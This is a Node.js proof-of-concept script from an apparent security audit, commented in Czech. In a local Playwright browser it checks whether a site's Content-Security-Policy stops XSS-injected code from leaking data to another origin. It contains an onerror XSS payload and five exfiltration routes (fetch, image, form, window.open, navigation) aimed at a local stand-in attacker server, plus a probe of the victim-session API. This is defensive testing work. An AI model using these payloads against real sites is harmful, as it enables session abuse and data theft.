/* PoC čočky XS (audit 20. 11. 2026): co CSP z netlify.toml dovolí skriptu,
 * který by se do stránky dostal (XSS). Stránka s TOUTÉŽ hlavičkou CSP zkusí
 * odvést značku na cizí původ pěti cestami; druhý místní server počítá, co
 * dorazilo. Bez sítě (jen 127.0.0.1).
 *   node podklady/audit_2026-11-20/poc_XS_csp_odvod.mjs
 */
import { createRequire } from 'module';
import { createServer } from 'http';
import { readFileSync } from 'fs';
import path from 'path';
const require = createRequire(path.resolve('package.json'));
const { chromium } = require('playwright');
const CSP = (readFileSync(path.resolve('netlify.toml'), 'utf8').match(/Content-Security-Policy = "([^"]+)"/) || [])[1];
const doslo = new Set();
const cizi = createServer((req, res) => { const m = req.url.match(/cesta=([a-z]+)/); if (m) doslo.add(m[1]); res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' }); res.end('ok'); });
await new Promise(r => cizi.listen(0, '127.0.0.1', r));
const CIZI = 'http://localhost:' + cizi.address().port;   // jiný původ než 127.0.0.1:<port aplikace>
const app = createServer((req, res) => {
  if (req.url.startsWith('/api/')) { res.writeHead(200, { 'Content-Type': 'application/json' }); return res.end('{"ok":true}'); }
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Content-Security-Policy': CSP });
  res.end('<!DOCTYPE html><meta charset="utf-8"><body><div id="x"></div></body>');
});
await new Promise(r => app.listen(0, '127.0.0.1', r));
const b = await chromium.launch({ args: ['--no-sandbox'] });
const ctx = await b.newContext(); const p = await ctx.newPage();
await p.goto('http://127.0.0.1:' + app.address().port + '/');
/* „vložený“ skript = obsluha onerror v HTML vloženém přes innerHTML (totéž, co by udělal uložený XSS) */
const r = await p.evaluate(async (CIZI) => {
  const v = {};
  window.__beh = async () => {
    try { await fetch(CIZI + '/?cesta=fetch', { mode: 'no-cors' }); v.fetch = 'odesláno'; } catch (e) { v.fetch = 'zablokováno'; }
    await new Promise(res => { const i = new Image(); i.onload = i.onerror = res; i.src = CIZI + '/?cesta=img'; setTimeout(res, 800); });
    try { const f = document.createElement('form'); f.action = CIZI + '/?cesta=form'; f.method = 'GET'; f.target = '_blank'; const i = document.createElement('input'); i.name = 'cesta'; i.value = 'form'; f.appendChild(i); document.body.appendChild(f); f.submit(); } catch (e) {}
    try { window.open(CIZI + '/?cesta=okno'); } catch (e) {}
    try { const o = await fetch('/api/uzivatele'); v.vlastniApi = o.ok ? 'dostupné (pod relací oběti)' : 'chyba'; } catch (e) { v.vlastniApi = 'zablokováno'; }
    try { new Function('return 1')(); v.eval = 'povoleno'; } catch (e) { v.eval = 'zablokováno'; }
    v.hotovo = true;
  };
  document.getElementById('x').innerHTML = '<img src=x onerror="window.__inline=1;__beh()">';
  for (let i = 0; i < 40 && !v.hotovo; i++) await new Promise(res => setTimeout(res, 100));
  v.inlineObsluha = window.__inline ? 'spustila se' : 'zablokována';
  return v;
}, CIZI);
await p.waitForTimeout(800);
/* poslední cesta: navigace celé stránky */
await p.evaluate((CIZI) => { location.href = CIZI + '/?cesta=navigace'; }, CIZI).catch(() => {});
await p.waitForTimeout(800);
await b.close(); app.close(); cizi.close();
console.log('CSP: ' + CSP);
console.log('vložená obsluha (onerror): ' + r.inlineObsluha + ' · eval/new Function: ' + r.eval + ' · vlastní /api/*: ' + r.vlastniApi);
for (const c of ['fetch', 'img', 'form', 'okno', 'navigace']) console.log('  odvod na cizí původ cestou „' + c + '": ' + (doslo.has(c) ? 'PROŠEL' : 'zablokován'));
const pruchod = ['okno', 'navigace'].filter(c => doslo.has(c));
console.log('\nVÝSLEDEK: ' + (pruchod.length ? 'ZRANITELNÉ (jen jako následek XSS) — CSP neudrží data uvnitř: ' + pruchod.join(', ') : 'ODOLNÉ — žádná cesta ven neprošla'));
